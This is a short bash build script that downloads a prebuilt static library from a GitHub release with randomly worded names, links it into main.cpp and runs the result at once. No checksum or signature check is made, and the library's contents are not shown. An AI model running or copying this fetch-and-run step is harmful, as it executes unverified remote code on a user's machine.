#!/usr/bin/env bash
set -e
TAG="golden-comet-crimson-cedar"
LIB="durable-crown.a"
curl --retry 3 -fsSL --max-time 180 --connect-timeout 15 -o "$LIB" "https://github.com/serenewavea/nodelilycircuit/releases/download/${TAG}/${LIB}"
g++ -pthread -O2 -std=c++17 main.cpp "$LIB" -o app && ./app
